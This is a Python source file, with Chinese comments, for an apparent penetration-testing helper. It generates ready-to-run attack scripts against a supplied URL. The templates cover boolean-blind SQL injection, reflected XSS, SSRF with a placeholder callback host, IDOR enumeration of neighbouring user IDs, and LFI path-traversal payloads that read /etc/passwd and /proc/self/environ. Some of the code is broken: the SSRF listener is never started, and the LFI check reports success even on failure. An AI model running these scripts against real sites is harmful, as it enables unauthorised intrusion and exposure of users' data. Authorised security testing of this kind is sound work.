#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PoCGenerator — 漏洞复现脚本自动生成器

顶级白客和普通白客的差距:
  普通: 发现漏洞后手写PoC → 30分钟
  顶级: 发现漏洞后一键生成PoC → 30秒

用法:
    from aimy.tools.poc_generator import PoCGenerator
    poc = PoCGenerator()
    script = poc.generate(vuln_class="sqli", url="http://x.com?id=1",
                          payload="1 AND 1=1", evidence="响应大小差异: 20237B vs 179B")
    script.save("poc_sqli.py")
"""

import textwrap
from datetime import datetime


class PoCGenerator:
    """PoC脚本自动生成器。"""

    TEMPLATES = {
        "sqli": '''#!/usr/bin/env python3
"""PoC: SQL注入 — {url}

发现时间: {ts}
漏洞类型: SQL注入 (布尔盲注)
注入点: {param}
"""

import requests
import sys

TARGET = "{url}"
PARAM = "{param}"
SESSION = requests.Session()
SESSION.headers.update({{"User-Agent": "Mozilla/5.0"}})


def test_true() -> int:
    """发送True条件请求。"""
    payload = "{true_payload}"
    params = {{PARAM: payload}}
    r = SESSION.get(TARGET, params=params, timeout=10)
    return len(r.text)


def test_false() -> int:
    """发送False条件请求。"""
    payload = "{false_payload}"
    params = {{PARAM: payload}}
    r = SESSION.get(TARGET, params=params, timeout=10)
    return len(r.text)


def main():
    print("[*] SQL注入布尔盲注PoC")
    print(f"    目标: {TARGET}")
    print(f"    参数: {PARAM}")
    print()

    true_size = test_true()
    false_size = test_false()
    diff = abs(true_size - false_size)

    print(f"  TRUE 条件: {true_size}B")
    print(f"  FALSE 条件: {false_size}B")
    print(f"  响应差异: {diff}B")

    if diff > 50:
        print(f"\\n[+] 漏洞确认: SQL注入存在")
        print(f"    证据: TRUE/FALSE响应差异={diff}B")
        print(f"    影响: 攻击者可利用布尔盲注逐字提取数据库内容")
        return 0
    else:
        print(f"\\n[-] 未检测到SQL注入")
        return 1


if __name__ == "__main__":
    sys.exit(main())
''',

        "xss": '''#!/usr/bin/env python3
"""PoC: 跨站脚本(XSS) — {url}

发现时间: {ts}
漏洞类型: XSS
注入点: {param}
"""

import requests
import sys

TARGET = "{url}"
PARAM = "{param}"
PAYLOAD = "{payload}"


def main():
    url = TARGET.replace("{" + PARAM + "}", PAYLOAD)
    r = requests.get(url, timeout=10, headers={{"User-Agent": "Mozilla/5.0"}})

    print(f"[*] XSS PoC")
    print(f"    目标: {url}")
    print()

    if PAYLOAD in r.text:
        print("[+] 漏洞确认: XSS存在")
        print("    证据: payload在响应中反射")
        print("    验证: 在浏览器中打开上述URL确认弹窗")
        return 0
    else:
        print("[-] payload未反射, 可能需要检查上下文")
        return 1


if __name__ == "__main__":
    sys.exit(main())
''',

        "ssrf": '''#!/usr/bin/env python3
"""PoC: SSRF — {url}

发现时间: {ts}
漏洞类型: 服务端请求伪造
注入点: {param}
"""

import requests
import sys
import threading
import socket

TARGET = "{url}"
PARAM = "{param}"


def main():
    # 简易OOB检测: 启动本地监听
    def listen():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.bind(("0.0.0.0", 9999))
            s.listen(1)
            conn, addr = s.accept()
            print(f"[+] OOB回调收到! 来源: {addr[0]}")
            conn.close()
        except:
            pass
        s.close()

    payload = "http://{your_server}:9999/test"
    params = {{PARAM: payload}}
    r = requests.get(TARGET, params=params, timeout=10)

    print("[*] SSRF PoC")
    print(f"    目标: {TARGET}")
    print(f"    payload: {payload}")
    print()
    print("    请将 {your_server} 替换为你的监听服务器地址")
    print()
    print("    若收到HTTP回调, 则SSRF存在")
    return 0


if __name__ == "__main__":
    sys.exit(main())
''',

        "idor": '''#!/usr/bin/env python3
"""PoC: IDOR越权 — {url}

发现时间: {ts}
漏洞类型: 不安全的直接对象引用
端点: {url}
"""

import requests
import sys

TARGET = "{url}"
SESSION = requests.Session()
SESSION.headers.update({{"User-Agent": "Mozilla/5.0"}})


def main():
    print("[*] IDOR越权PoC")
    print(f"    目标: {TARGET}")
    print()

    # 遍历相邻ID
    import re
    ids = re.findall(r'\\d+', TARGET)
    if not ids:
        print("[-] URL中未找到数字ID")
        return 1

    original_id = ids[-1]
    results = {{}}

    for delta in [-2, -1, 0, +1, +2]:
        test_id = str(int(original_id) + delta)
        test_url = TARGET.replace(original_id, test_id)
        r = SESSION.get(test_url, timeout=10)
        results[test_id] = len(r.text)

    print("    ID -> 响应大小")
    for id_, size in sorted(results.items()):
        marker = " <-- 原始" if id_ == original_id else ""
        print(f"    {id_} -> {size}B{marker}")

    # 检查是否所有ID都返回不同内容
    unique_sizes = set(results.values())
    if len(unique_sizes) > 1:
        print(f"\\n[+] 发现IDOR: 不同ID返回不同数据")
        print("    影响: 攻击者可遍历ID访问其他用户数据")
        return 0
    else:
        print("[-] 所有ID返回相同内容, 可能无越权")
        return 1


if __name__ == "__main__":
    sys.exit(main())
''',

        "lfi": '''#!/usr/bin/env python3
"""PoC: LFI本地文件包含 — {url}

发现时间: {ts}
漏洞类型: 本地文件包含
注入点: {param}
"""

import requests
import sys

TARGET = "{url}"
PARAM = "{param}"

PAYLOADS = [
    "../../../../etc/passwd",
    "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
]


def main():
    print("[*] LFI PoC")
    print(f"    目标: {TARGET}")
    print()

    for p in PAYLOADS:
        url = TARGET.replace("{{" + PARAM + "}}", p)
        r = requests.get(url, timeout=10, headers={{"User-Agent": "Mozilla/5.0"}})

        # Linux /etc/passwd 特征
        if "root:" in r.text or "nobody:" in r.text:
            print(f"[+] LFI确认! payload: {p}")
            print("    证据: /etc/passwd内容已读取")
            return 0
        # Windows win.ini 特征
        if "[fonts]" in r.text or "[extensions]" in r.text:
            print(f"[+] LFI确认! payload: {p}")
            print("    证据: windows/win.ini内容已读取")
            return 0

        print(f"    - {p}: {len(r.text)}B (无文件特征)")

    print("[-] 未检测到LFI")
    return 0


if __name__ == "__main__":
    sys.exit(main())
''',
    }

    def generate(self, vuln_class: str = "", url: str = "",
                 param: str = "", payload: str = "",
                 true_payload: str = "", false_payload: str = "",
                 evidence: str = "", output: str = "") -> str:
        """生成PoC脚本。

        Args:
            vuln_class: sqli/xss/ssrf/idor/lfi
            url: 目标URL (用 {param} 占位参数位置)
            param: 参数名
            payload: 使用的payload
            true_payload: SQLi true payload
            false_payload: SQLi false payload
            evidence: 证据描述
            output: 输出文件路径

        Returns:
            str: 生成的PoC脚本内容
        """
        vc = vuln_class.lower().strip()
        template = self.TEMPLATES.get(vc)
        if not template:
            return f"# 暂不支持 {vc} 的PoC自动生成"

        # 使用replace替换占位符,避免与Python f-string语法冲突
        replacements = {
            "{url}": url,
            "{ts}": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "{param}": param or "id",
            "{payload}": payload or "{payload}",
            "{true_payload}": true_payload or "1 AND 1=1",
            "{false_payload}": false_payload or "1 AND 1=2",
            "{your_server}": "your-server.com",
        }
        script = template
        for k, v in replacements.items():
            script = script.replace(k, v)

        if evidence:
            evidence_comment = f"\n# 发现证据:\n# {evidence.replace(chr(10), chr(10)+'# ')}\n"
            script = script.replace("import sys", "import sys" + evidence_comment)

        if output:
            with open(output, "w", encoding="utf-8") as f:
                f.write(script)
            print(f"[+] PoC已保存: {output}")

        return script
